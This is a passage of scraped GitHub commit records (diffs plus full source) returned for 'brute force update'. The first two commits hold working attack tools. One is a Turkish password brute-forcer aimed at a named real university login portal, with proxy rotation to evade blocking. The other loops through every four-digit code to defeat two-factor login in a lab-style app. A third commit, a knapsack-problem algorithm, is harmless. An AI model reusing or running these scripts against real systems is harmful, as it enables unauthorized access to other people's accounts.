try:\n             b.open(adres, timeout=10)\n             b.select_form(nr=0)\n@@ -88,9 +87,9 @@ def bruteforceMyISU():\n             b.method = \"POST\"\n             submit = b.submit()\n \n-            if submit.geturl() == \"https:\/\/myisu.istinye.edu.tr\/\":\n+            if submit.geturl() == \"link\":\n                 print(f\"{Back.GREEN}SIFRE BULUNDU = \"+sifre+f\"{Back.RESET}\")\n-                kaydet = io.open(\"myISU.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")\n+                kaydet = io.open(\"1.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")\n                 break\n             else:\n                 print(f\"{Back.RED}ESLESMEDI{Back.RESET}\\n\")\n@@ -131,10 +130,10 @@ def db():\n \n if __name__ == '__main__':\n     if secim == \"a\" or secim == \"A\":\n-        bruteforceMyISU()\n+        bruteforce1()\n         proxy()\n     elif secim == \"b\" or secim == \"B\":\n         db()\n         proxy()\n     else:\n-        print(\"HATALI GIRIS\")\n\\ No newline at end of file\n+        print(\"HATALI GIRIS\")\n","files":{"\/brute-force.py":{"changes":[{"diff":"\n # Dosya i\u015flemleri i\u00e7in kulland\u0131\u011f\u0131m\u0131z k\u00fct\u00fcphane\n \n print(\"\\n \uff09\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\uff08\")\n-print(f\" \uff09          {Back.RED}ISTINYE UNIVERSITESI{Back.RESET}          \uff08\")\n print(\" \uff09----------------------------------------\uff08\")\n print(\" \uff09           Brute-Force Attack           \uff08\")\n print(\" \uff09           ------------------           \uff08\")\n","add":0,"remove":1,"filename":"\/brute-force.py","badparts":["print(f\" \uff09          {Back.RED}ISTINYE UNIVERSITESI{Back.RESET}          \uff08\")"],"goodparts":[]},{"diff":"\n # Browser kimli\u011fini tan\u0131ml\u0131yoruz -> useragentstring.com\n \n-print(\"[A] myISU\")\n+print(\"[A] LINK\")\n print(\"[B] ECZANE DB\")\n secim = input(\"SECIM    = \")\n print(\"-------------------------------------------------\\n\")\n","add":1,"remove":1,"filename":"\/brute-force.py","badparts":["print(\"[A] myISU\")"],"goodparts":["print(\"[A] LINK\")"]},{"diff":"\n         return proxy()\n \n \n-def bruteforceMyISU():\n+def bruteforce1():\n     sifre = open(sifreDosyasi).read().splitlines()\n     try_login = 0\n     print(f\"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\\n\")\n","add":1,"remove":1,"filename":"\/brute-force.py","badparts":["def bruteforceMyISU():"],"goodparts":["def bruteforce1():"]},{"diff":"\n             try_login = 0\n         sys.stdout.write('\\r[-] {} [-] '.format(sifre))\n         sys.stdout.flush()\n-        adres = \"https:\/\/myisu.istinye.edu.tr\/tr\/user\/login?destination=\"\n+        adres = \"link\"\n         try:\n             b.open(adres, timeout=10)\n             b.select_form(nr=0)\n","add":1,"remove":1,"filename":"\/brute-force.py","badparts":["        adres = \"https:\/\/myisu.istinye.edu.tr\/tr\/user\/login?destination=\""],"goodparts":["        adres = \"link\""]},{"diff":"\n             b.method = \"POST\"\n             submit = b.submit()\n \n-            if submit.geturl() == \"https:\/\/myisu.istinye.edu.tr\/\":\n+            if submit.geturl() == \"link\":\n                 print(f\"{Back.GREEN}SIFRE BULUNDU = \"+sifre+f\"{Back.RESET}\")\n-                kaydet = io.open(\"myISU.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")\n+                kaydet = io.open(\"1.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")\n                 break\n             else:\n                 print(f\"{Back.RED}ESLESMEDI{Back.RESET}\\n\")\n","add":2,"remove":2,"filename":"\/brute-force.py","badparts":["            if submit.geturl() == \"https:\/\/myisu.istinye.edu.tr\/\":","                kaydet = io.open(\"myISU.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")"],"goodparts":["            if submit.geturl() == \"link\":","                kaydet = io.open(\"1.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")"]},{"diff":"\n \n if __name__ == '__main__':\n     if secim == \"a\" or secim == \"A\":\n-        bruteforceMyISU()\n+        bruteforce1()\n         proxy()\n     elif secim == \"b\" or secim == \"B\":\n         db()\n         proxy()\n     else:\n-        print(\"HATALI GIRIS\")\n\\ No newline at end of file\n+        print(\"HATALI GIRIS\")\n","add":2,"remove":2,"filename":"\/brute-force.py","badparts":["        bruteforceMyISU()","        print(\"HATALI GIRIS\")"],"goodparts":["        bruteforce1()","        print(\"HATALI GIRIS\")"]}],"source":"\nfrom colorama import Fore, Back import mechanize import sys from proxylist import ProxyList import logging import io print(\"\\n \uff09\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\uff08\") print(f\" \uff09 {Back.RED}ISTINYE UNIVERSITESI{Back.RESET} \uff08\") print(\" \uff09----------------------------------------\uff08\") print(\" \uff09 Brute-Force Attack \uff08\") print(\" \uff09 ------------------ \uff08\") print(f\" \uff09 {Fore.BLUE}Yusuf AKTAN{Fore.RESET} \uff08\") print(\" \uff09\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\uff08\") print(\"\\n-------------------------------------------------\") b=mechanize.Browser() b.set_handle_equiv(True) b.set_handle_gzip(True) b.set_handle_redirect(True) b.set_handle_referer(True) b.set_handle_robots(False) b._factory.is_html=True b.addheaders=[('User-agent', 'Mozilla\/5.0(Windows NT 10.0; Win64; x64) AppleWebKit\/537.36(KHTML, like Gecko) Chrome\/90.0.4430.212 Safari\/537.36' )] print(\"[A] myISU\") print(\"[B] ECZANE DB\") secim=input(\"SECIM =\") print(\"-------------------------------------------------\\n\") kullaniciadi=input(f\"{Fore.YELLOW}E-Posta\/Kullan\u0131c\u0131 Ad\u0131={Fore.RESET}\") sifreDosyasi=input(f\"{Fore.YELLOW}Sifre Dosyas\u0131 ={Fore.RESET}\") proxyList=input(f\"{Fore.YELLOW}Proxy Dosyas\u0131 ={Fore.RESET}\") print(\"-------------------------------------------------\\n\") def proxy(): logging.basicConfig() pl=ProxyList() try: pl.load_file(proxyList) except: sys.exit(\"Hatal\u0131 dosya !\") pl.random() getProxy=pl.random().address() b.set_proxies(proxies={\"https\": getProxy}) try: checkProxyIP=b.open(\"https:\/\/api.ipify.org\/?format=raw\", timeout=10) except: return proxy() def bruteforceMyISU(): sifre=open(sifreDosyasi).read().splitlines() try_login=0 print(f\"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\\n\") for sifre in sifre: try_login +=1 if try_login==5: try_login=0 sys.stdout.write('\\r[-]{}[-] '.format(sifre)) sys.stdout.flush() adres=\"https:\/\/myisu.istinye.edu.tr\/tr\/user\/login?destination=\" try: b.open(adres, timeout=10) b.select_form(nr=0) b.form['name']=kullaniciadi b.form['pass']=sifre b.method=\"POST\" submit=b.submit() if submit.geturl()==\"https:\/\/myisu.istinye.edu.tr\/\": print(f\"{Back.GREEN}SIFRE BULUNDU=\"+sifre+f\"{Back.RESET}\") kaydet=io.open(\"myISU.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" +kullaniciadi +\"\\t\\tSifre:\" +sifre +\"\\n\") break else: print(f\"{Back.RED}ESLESMEDI{Back.RESET}\\n\") except: print(f'{Back.MAGENTA}BAGLANTI HATASI !{Back.RESET}\\n') sys.stdout.flush() break def db(): sifre=open(sifreDosyasi).read().splitlines() try_login=0 print(f\"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\\n\") for sifre in sifre: try_login +=1 if try_login==5: try_login=0 sys.stdout.write('\\r[-]{}[-] '.format(sifre)) sys.stdout.flush() adres=\"http:\/\/localhost\/kodlar\/anasayfa1.php\" try: b.open(adres, timeout=2) b.select_form(nr=0) b.form['kullanici']=kullaniciadi b.form['pass']=sifre b.method=\"POST\" submit=b.submit() if submit.geturl()==\"http:\/\/localhost\/kodlar\/anasayfa2.php\": print(f\"{Back.GREEN}SIFRE BULUNDU=\"+sifre+f\"{Back.RESET}\") kaydet=io.open(\"eczanedb.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" +kullaniciadi +\"\\t\\tSifre:\" +sifre +\"\\n\") break else: print(f\"{Back.RED}ESLESMEDI{Back.RESET}\\n\") except: print(f'{Back.MAGENTA}BAGLANTI HATASI !{Back.RESET}\\n') sys.stdout.flush() break if __name__=='__main__': if secim==\"a\" or secim==\"A\": bruteforceMyISU() proxy() elif secim==\"b\" or secim==\"B\": db() proxy() else: print(\"HATALI GIRIS\") ","sourceWithComments":"from colorama import Fore, Back\n# Terminali renklendirmemizi sa\u011flayan k\u00fct\u00fcphane\n\nimport mechanize\n# Web sitelerinde login i\u015flemleri yapmam\u0131z\u0131 sa\u011flayan k\u00fct\u00fcphane\n\nimport sys\n# Program\u0131 durdurmak, ekrana \u00e7\u0131kt\u0131 vermek gibi\n# basit i\u015flemleri yapmam\u0131z\u0131 sa\u011flar.\n\nfrom proxylist import ProxyList\n# Atak yapt\u0131\u011f\u0131m\u0131z siteden, block yememek i\u00e7in kulland\u0131\u011f\u0131m\u0131z k\u00fct\u00fcphane\n\nimport logging\n# Proxy listesi i\u00e7in kulland\u0131\u011f\u0131m\u0131z k\u00fct\u00fcphane\n\nimport io\n# Dosya i\u015flemleri i\u00e7in kulland\u0131\u011f\u0131m\u0131z k\u00fct\u00fcphane\n\nprint(\"\\n \uff09\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\ufe36\uff08\")\nprint(f\" \uff09          {Back.RED}ISTINYE UNIVERSITESI{Back.RESET}          \uff08\")\nprint(\" \uff09----------------------------------------\uff08\")\nprint(\" \uff09           Brute-Force Attack           \uff08\")\nprint(\" \uff09           ------------------           \uff08\")\nprint(f\" \uff09               {Fore.BLUE}Yusuf AKTAN{Fore.RESET}              \uff08\")\nprint(\" \uff09\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\ufe35\uff08\")\n# Ufak bir acilis ekrani.\nprint(\"\\n-------------------------------------------------\")\n\nb = mechanize.Browser()\n# Browser nesnesi olu\u015fturuldu\nb.set_handle_equiv(True)\nb.set_handle_gzip(True)\nb.set_handle_redirect(True)\nb.set_handle_referer(True)\nb.set_handle_robots(False)\n# Giri\u015f yaparken kar\u015f\u0131m\u0131za \u00e7\u0131kan \"ben robot de\u011filim\"\n# gibi sorunlar\u0131 a\u015fmak i\u00e7in ayarlamalar yap\u0131yoruz.\nb._factory.is_html = True\n\nb.addheaders = [('User-agent',\n                 'Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/90.0.4430.212 Safari\/537.36'\n                 )]\n# Browser kimli\u011fini tan\u0131ml\u0131yoruz -> useragentstring.com\n\nprint(\"[A] myISU\")\nprint(\"[B] ECZANE DB\")\nsecim = input(\"SECIM    = \")\nprint(\"-------------------------------------------------\\n\")\nkullaniciadi = input(f\"{Fore.YELLOW}E-Posta\/Kullan\u0131c\u0131 Ad\u0131 = {Fore.RESET}\")\nsifreDosyasi = input(f\"{Fore.YELLOW}Sifre Dosyas\u0131         = {Fore.RESET}\")\nproxyList = input(f\"{Fore.YELLOW}Proxy Dosyas\u0131         = {Fore.RESET}\")\nprint(\"-------------------------------------------------\\n\")\n\n\ndef proxy():\n    logging.basicConfig()\n    pl = ProxyList()\n    try:\n        pl.load_file(proxyList)\n    except:\n        sys.exit(\"Hatal\u0131 dosya !\")\n    pl.random()\n    getProxy = pl.random().address()\n    b.set_proxies(proxies={\"https\": getProxy})\n    try:\n        checkProxyIP = b.open(\"https:\/\/api.ipify.org\/?format=raw\", timeout=10)\n    except:\n        return proxy()\n\n\ndef bruteforceMyISU():\n    sifre = open(sifreDosyasi).read().splitlines()\n    try_login = 0\n    print(f\"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\\n\")\n    for sifre in sifre:\n        try_login += 1\n        if try_login == 5:\n            try_login = 0\n        sys.stdout.write('\\r[-] {} [-] '.format(sifre))\n        sys.stdout.flush()\n        adres = \"https:\/\/myisu.istinye.edu.tr\/tr\/user\/login?destination=\"\n        try:\n            b.open(adres, timeout=10)\n            b.select_form(nr=0)\n            b.form['name'] = kullaniciadi\n            b.form['pass'] = sifre\n            b.method = \"POST\"\n            submit = b.submit()\n\n            if submit.geturl() == \"https:\/\/myisu.istinye.edu.tr\/\":\n                print(f\"{Back.GREEN}SIFRE BULUNDU = \"+sifre+f\"{Back.RESET}\")\n                kaydet = io.open(\"myISU.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")\n                break\n            else:\n                print(f\"{Back.RED}ESLESMEDI{Back.RESET}\\n\")\n        except :\n            print(f'{Back.MAGENTA}BAGLANTI HATASI !{Back.RESET}\\n')\n            sys.stdout.flush()\n            break\n\ndef db():\n    sifre = open(sifreDosyasi).read().splitlines()\n    try_login = 0\n    print(f\"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\\n\")\n    for sifre in sifre:\n        try_login += 1\n        if try_login == 5:\n            try_login = 0\n        sys.stdout.write('\\r[-] {} [-] '.format(sifre))\n        sys.stdout.flush()\n        adres = \"http:\/\/localhost\/kodlar\/anasayfa1.php\"\n        try:\n            b.open(adres, timeout=2)\n            b.select_form(nr=0)\n            b.form['kullanici'] = kullaniciadi\n            b.form['pass'] = sifre\n            b.method = \"POST\"\n            submit = b.submit()\n\n            if submit.geturl() == \"http:\/\/localhost\/kodlar\/anasayfa2.php\":\n                print(f\"{Back.GREEN}SIFRE BULUNDU = \"+sifre+f\"{Back.RESET}\")\n                kaydet = io.open(\"eczanedb.txt\", \"a\").write(\"Kullan\u0131c\u0131 Ad\u0131:\" + kullaniciadi + \"\\t\\tSifre:\" + sifre + \"\\n\")\n                break\n            else:\n                print(f\"{Back.RED}ESLESMEDI{Back.RESET}\\n\")\n        except :\n            print(f'{Back.MAGENTA}BAGLANTI HATASI !{Back.RESET}\\n')\n            sys.stdout.flush()\n            break\n\nif __name__ == '__main__':\n    if secim == \"a\" or secim == \"A\":\n        bruteforceMyISU()\n        proxy()\n    elif secim == \"b\" or secim == \"B\":\n        db()\n        proxy()\n    else:\n        print(\"HATALI GIRIS\")"}},"msg":"Update brute-force.py"}},"https:\/\/github.com\/H4shByte\/Web-App-Exploit-Scripts":{"d073621e5637755f69881fc141564f4e5b92b13d":{"url":"https:\/\/api.github.com\/repos\/H4shByte\/Web-App-Exploit-Scripts\/commits\/d073621e5637755f69881fc141564f4e5b92b13d","html_url":"https:\/\/github.com\/H4shByte\/Web-App-Exploit-Scripts\/commit\/d073621e5637755f69881fc141564f4e5b92b13d","sha":"d073621e5637755f69881fc141564f4e5b92b13d","keyword":"brute force update","diff":"diff --git a\/Authentication\/2fa_brute_force.py b\/Authentication\/2fa_brute_force.py\nindex 47640e5..7c77c68 100644\n--- a\/Authentication\/2fa_brute_force.py\n+++ b\/Authentication\/2fa_brute_force.py\n@@ -7,44 +7,66 @@\n \n proxies = {'http': 'http:\/\/127.0.0.1:8080', 'https': 'http:\/\/127.0.0.1:8080'}\n \n-#def 2fa(code):\n- #   if len(code) < 5:\n- #       code = code + 1\n-  #      return code\n-   # else:\n-    #    return(\"Exhausted all code combinations\")\n+#MFA code starts at -1 but first iteration within brute_force() func is 0000    \n+mfa_code = '%04d' % -1\n \n def brute_force(s, url):\n     login_path = \"\/login2\"\n-    csrf_token = get_csrf_token(s,url)\n-    print(csrf_token)\n-    data = {'csrf': csrf_token, 'mfa-code': '1234'}\n+    csrf_token = get_csrf_token_login2(s,url)\n+    #print(csrf_token)\n+    global mfa_code\n+    if int(mfa_code) < 10000:\n+        mfa_code = '%04d' % (int(mfa_code) + 1)\n+    #print(mfa_code)\n+    data = {'csrf': csrf_token, 'mfa-code': mfa_code}\n     res2 = s.post(url + login_path, data=data, verify=False, proxies=proxies)\n-    return res2.status_code\n+    #print(res2.url)\n+    return res2.url, mfa_code\n \n-def get_csrf_token(s, url):\n+def get_csrf_token_login2(s, url):\n+    login_path = \"\/login2\"\n+    r = s.get(url + login_path, verify=False, proxies=proxies)\n+    soup = BeautifulSoup(r.text, 'html.parser')\n+    csrf2 = soup.find(\"input\")['value']\n+    return csrf2\n+\n+def get_csrf_token_login(s, url):\n     login_path = \"\/login\"\n     r = s.get(url + login_path, verify=False, proxies=proxies)\n     soup = BeautifulSoup(r.text, 'html.parser')\n-    csrf = soup.find(\"input\")['value']\n-    return csrf\n+    csrf1 = soup.find(\"input\")['value']\n+    return csrf1\n \n def login(s, url):\n     login_path = \"\/login\"\n-    csrf_token = get_csrf_token(s, url)\n-    print(csrf_token)\n+    csrf_token = get_csrf_token_login(s, url)\n+    #print(csrf_token)\n     data = {'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'}\n     res = s.post(url + login_path, data=data, verify=False, proxies=proxies)\n-    print(res.status_code)\n-    return res.status_code\n+    #print(res.url)\n+    return res.url\n \n def main():\n     if len(sys.argv) != 2:\n-        print(\"incorrect format\")\n+        print(\"not enough arguments\")\n     url = sys.argv[1]\n-    print(\"Logging in user\")\n+    print(\"Logging in as user: carlos\")\n     s = requests.Session()\n-    login(s, url)\n+    \n+    while True:\n+        login_attempt = login(s, url)\n+        if '\/login2' in str(login_attempt):\n+            brute_attempt = brute_force(s, url)\n+            print('testing mfa code: '+ mfa_code)\n+            brute_attempt = brute_force(s, url)\n+            print('testing mfa code: '+ mfa_code)\n+            if '\/my-account' in brute_attempt:\n+                print(\"MFA code found: \" )\n+                break\n+            \n+        else:\n+            print('Logging in again')\n+            login_attempt = login(s, url)\n \n if __name__ == \"__main__\":\n     main()\n","message":"","files":{"\/Authentication\/2fa_brute_force.py":{"changes":[{"diff":"\n \n proxies = {'http': 'http:\/\/127.0.0.1:8080', 'https': 'http:\/\/127.0.0.1:8080'}\n \n-#def 2fa(code):\n- #   if len(code) < 5:\n- #       code = code + 1\n-  #      return code\n-   # else:\n-    #    return(\"Exhausted all code combinations\")\n+#MFA code starts at -1 but first iteration within brute_force() func is 0000    \n+mfa_code = '%04d' % -1\n \n def brute_force(s, url):\n     login_path = \"\/login2\"\n-    csrf_token = get_csrf_token(s,url)\n-    print(csrf_token)\n-    data = {'csrf': csrf_token, 'mfa-code': '1234'}\n+    csrf_token = get_csrf_token_login2(s,url)\n+    #print(csrf_token)\n+    global mfa_code\n+    if int(mfa_code) < 10000:\n+        mfa_code = '%04d' % (int(mfa_code) + 1)\n+    #print(mfa_code)\n+    data = {'csrf': csrf_token, 'mfa-code': mfa_code}\n     res2 = s.post(url + login_path, data=data, verify=False, proxies=proxies)\n-    return res2.status_code\n+    #print(res2.url)\n+    return res2.url, mfa_code\n \n-def get_csrf_token(s, url):\n+def get_csrf_token_login2(s, url):\n+    login_path = \"\/login2\"\n+    r = s.get(url + login_path, verify=False, proxies=proxies)\n+    soup = BeautifulSoup(r.text, 'html.parser')\n+    csrf2 = soup.find(\"input\")['value']\n+    return csrf2\n+\n+def get_csrf_token_login(s, url):\n     login_path = \"\/login\"\n     r = s.get(url + login_path, verify=False, proxies=proxies)\n     soup = BeautifulSoup(r.text, 'html.parser')\n-    csrf = soup.find(\"input\")['value']\n-    return csrf\n+    csrf1 = soup.find(\"input\")['value']\n+    return csrf1\n \n def login(s, url):\n     login_path = \"\/login\"\n-    csrf_token = get_csrf_token(s, url)\n-    print(csrf_token)\n+    csrf_token = get_csrf_token_login(s, url)\n+    #print(csrf_token)\n     data = {'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'}\n     res = s.post(url + login_path, data=data, verify=False, proxies=proxies)\n-    print(res.status_code)\n-    return res.status_code\n+    #print(res.url)\n+    return res.url\n \n def main():\n     if len(sys.argv) != 2:\n-        print(\"incorrect format\")\n+        print(\"not enough arguments\")\n     url = sys.argv[1]\n-    print(\"Logging in user\")\n+    print(\"Logging in as user: carlos\")\n     s = requests.Session()\n-    login(s, url)\n+    \n+    while True:\n+        login_attempt = login(s, url)\n+        if '\/login2' in str(login_attempt):\n+            brute_attempt = brute_force(s, url)\n+            print('testing mfa code: '+ mfa_code)\n+            brute_attempt = brute_force(s, url)\n+            print('testing mfa code: '+ mfa_code)\n+            if '\/my-account' in brute_attempt:\n+                print(\"MFA code found: \" )\n+                break\n+            \n+        else:\n+            print('Logging in again')\n+            login_attempt = login(s, url)\n \n if __name__ == \"__main__\":\n     main()\n","add":42,"remove":20,"filename":"\/Authentication\/2fa_brute_force.py","badparts":["    csrf_token = get_csrf_token(s,url)","    print(csrf_token)","    data = {'csrf': csrf_token, 'mfa-code': '1234'}","    return res2.status_code","def get_csrf_token(s, url):","    csrf = soup.find(\"input\")['value']","    return csrf","    csrf_token = get_csrf_token(s, url)","    print(csrf_token)","    print(res.status_code)","    return res.status_code","        print(\"incorrect format\")","    print(\"Logging in user\")","    login(s, url)"],"goodparts":["mfa_code = '%04d' % -1","    csrf_token = get_csrf_token_login2(s,url)","    global mfa_code","    if int(mfa_code) < 10000:","        mfa_code = '%04d' % (int(mfa_code) + 1)","    data = {'csrf': csrf_token, 'mfa-code': mfa_code}","    return res2.url, mfa_code","def get_csrf_token_login2(s, url):","    login_path = \"\/login2\"","    r = s.get(url + login_path, verify=False, proxies=proxies)","    soup = BeautifulSoup(r.text, 'html.parser')","    csrf2 = soup.find(\"input\")['value']","    return csrf2","def get_csrf_token_login(s, url):","    csrf1 = soup.find(\"input\")['value']","    return csrf1","    csrf_token = get_csrf_token_login(s, url)","    return res.url","        print(\"not enough arguments\")","    print(\"Logging in as user: carlos\")","    while True:","        login_attempt = login(s, url)","        if '\/login2' in str(login_attempt):","            brute_attempt = brute_force(s, url)","            print('testing mfa code: '+ mfa_code)","            brute_attempt = brute_force(s, url)","            print('testing mfa code: '+ mfa_code)","            if '\/my-account' in brute_attempt:","                print(\"MFA code found: \" )","                break","        else:","            print('Logging in again')","            login_attempt = login(s, url)"]}],"source":"\nimport requests import sys import urllib3 from bs4 import BeautifulSoup urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) proxies={'http': 'http:\/\/127.0.0.1:8080', 'https': 'http:\/\/127.0.0.1:8080'} def brute_force(s, url): login_path=\"\/login2\" csrf_token=get_csrf_token(s,url) print(csrf_token) data={'csrf': csrf_token, 'mfa-code': '1234'} res2=s.post(url +login_path, data=data, verify=False, proxies=proxies) return res2.status_code def get_csrf_token(s, url): login_path=\"\/login\" r=s.get(url +login_path, verify=False, proxies=proxies) soup=BeautifulSoup(r.text, 'html.parser') csrf=soup.find(\"input\")['value'] return csrf def login(s, url): login_path=\"\/login\" csrf_token=get_csrf_token(s, url) print(csrf_token) data={'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'} res=s.post(url +login_path, data=data, verify=False, proxies=proxies) print(res.status_code) return res.status_code def main(): if len(sys.argv) !=2: print(\"incorrect format\") url=sys.argv[1] print(\"Logging in user\") s=requests.Session() login(s, url) if __name__==\"__main__\": main() ","sourceWithComments":"import requests\nimport sys\nimport urllib3\nfrom bs4 import BeautifulSoup\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nproxies = {'http': 'http:\/\/127.0.0.1:8080', 'https': 'http:\/\/127.0.0.1:8080'}\n\n#def 2fa(code):\n #   if len(code) < 5:\n #       code = code + 1\n  #      return code\n   # else:\n    #    return(\"Exhausted all code combinations\")\n\ndef brute_force(s, url):\n    login_path = \"\/login2\"\n    csrf_token = get_csrf_token(s,url)\n    print(csrf_token)\n    data = {'csrf': csrf_token, 'mfa-code': '1234'}\n    res2 = s.post(url + login_path, data=data, verify=False, proxies=proxies)\n    return res2.status_code\n\ndef get_csrf_token(s, url):\n    login_path = \"\/login\"\n    r = s.get(url + login_path, verify=False, proxies=proxies)\n    soup = BeautifulSoup(r.text, 'html.parser')\n    csrf = soup.find(\"input\")['value']\n    return csrf\n\ndef login(s, url):\n    login_path = \"\/login\"\n    csrf_token = get_csrf_token(s, url)\n    print(csrf_token)\n    data = {'csrf': csrf_token, 'username': 'carlos', 'password': 'montoya'}\n    res = s.post(url + login_path, data=data, verify=False, proxies=proxies)\n    print(res.status_code)\n    return res.status_code\n\ndef main():\n    if len(sys.argv) != 2:\n        print(\"incorrect format\")\n    url = sys.argv[1]\n    print(\"Logging in user\")\n    s = requests.Session()\n    login(s, url)\n\nif __name__ == \"__main__\":\n    main()\n"}},"msg":"Update 2fa_brute_force.py"}},"https:\/\/github.com\/HT0710\/CSD301_Group-1_Knapsack-problem":{"fa3b9eb73b3a8a431bba9dc34105c8efa74c1c17":{"url":"https:\/\/api.github.com\/repos\/HT0710\/CSD301_Group-1_Knapsack-problem\/commits\/fa3b9eb73b3a8a431bba9dc34105c8efa74c1c17","html_url":"https:\/\/github.com\/HT0710\/CSD301_Group-1_Knapsack-problem\/commit\/fa3b9eb73b3a8a431bba9dc34105c8efa74c1c17","message":"Update Brute Force and Backtrack algorithm","sha":"fa3b9eb73b3a8a431bba9dc34105c8efa74c1c17","keyword":"brute force update","diff":"diff --git a\/Algorithms\/Algorithms.py b\/Algorithms\/Algorithms.py\nindex 8c28115..b65df17 100644\n--- a\/Algorithms\/Algorithms.py\n+++ b\/Algorithms\/Algorithms.py\n@@ -3,6 +3,7 @@\n import os\n \n from Algorithms.BranchAndBound import BranchAndBound\n+from Algorithms.BruteForce import BruteForce\n SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\n sys.path.append(os.path.dirname(SCRIPT_DIR))\n \n@@ -14,4 +15,5 @@\n DynamicPrograming = DynamicPrograming\n GreedyProgram = GreedyProgram\n Backtrack = Backtrack\n-BranchAndBound = BranchAndBound\n\\ No newline at end of file\n+BranchAndBound = BranchAndBound\n+BruteForce = BruteForce\n\\ No newline at end of file\ndiff --git a\/Algorithms\/Backtrack.py b\/Algorithms\/Backtrack.py\nindex 2660f45..e67955d 100644\n--- a\/Algorithms\/Backtrack.py\n+++ b\/Algorithms\/Backtrack.py\n@@ -6,7 +6,7 @@ class Backtrack:\n     @staticmethod\n     def findSolution(C : int, W : List[int], P : List[int]) -> List[int]:\n         '''\n-        Find a solution of knapsack problem using Dynamic Programing algorithms\n+        Find a solution of knapsack problem using Backtrack algorithms\n \n         @Parameters:\n         ----------\n@@ -32,7 +32,7 @@ def __knapSack(mW: int, w, v, n):\n             return [0, []]\n \n         if (w[n-1] > mW):\n-            return Backtrack.__knapSack(mW, w, v, n-1)\n+            return [0, []]\n \n         set1 = Backtrack.__knapSack(mW-w[n-1], w, v, n-1)\n         set2 = Backtrack.__knapSack(mW, w, v, n-1)\ndiff --git a\/Algorithms\/BruteForce.py b\/Algorithms\/BruteForce.py\nindex f271293..7173322 100644\n--- a\/Algorithms\/BruteForce.py\n+++ b\/Algorithms\/BruteForce.py\n@@ -1,50 +1,45 @@\n from typing import List\n-import itertools\n-\n-\n-def __main():\n-    P = [60, 100, 140, 200]\n-    W = [10, 20, 30, 40]\n-    C = 70\n-    print(BruteForce.findSolution(C, W, P))\n \n \n class BruteForce:\n+\n     @staticmethod\n-    def findSolution(C: int, W: List[int], P: List[int]) -> List[int]:\n+    def findSolution(C : int, W : List[int], P : List[int]) -> List[int]:\n+        '''\n+        Find a solution of knapsack problem using Brute Force algorithms\n+\n+        @Parameters:\n+        ----------\n+            - C : weight of knapsack\n+            - W : list weight of items\n+            - P : list price of items\n+\n+        @Return\n+        ----------\n+        List indexes of selected items\n+        '''\n+\n+        # Number of items\n         n = len(W)\n-        max_P = BruteForce.__algorithm(C, W, P, n)\n+        result = BruteForce.__knapSack(C, W, P, n)\n \n-        return BruteForce.__result(P, max_P)\n+        return result[1]\n \n     @staticmethod\n-    def __algorithm(C, W, P, n):\n-        if n == 0 or C == 0:\n-            return 0\n-\n-        # If weight of the nth item is\n-        # more than Knapsack of capacity W,\n-        # then this item cannot be included\n-        # in the optimal solution\n-        if (W[n-1] > C):\n-            return BruteForce.__algorithm(C, W, P, n-1)\n-\n-        # return the maximum of two cases:\n-        # (1) nth item included\n-        # (2) not included\n-        else:\n-            return max(\n-                P[n-1] + BruteForce.__algorithm(C-W[n-1], W, P, n-1),\n-                BruteForce.__algorithm(C, W, P, n-1))\n+    def __knapSack(mW: int, w, v, n):\n \n-    @staticmethod\n-    def __result(P: List[int], mP: int):\n-        # for i in range(len(P)):\n-        #     for j in itertools.combinations(P, i):\n-        #         if (sum(j) == mP):\n-        #             return [P.index(i) for i in j]\n-        return []\n+        if (mW == 0 or n == 0):\n+            return [0, []]\n+\n+        if (w[n-1] > mW):\n+            return BruteForce.__knapSack(mW, w, v, n-1)\n \n+        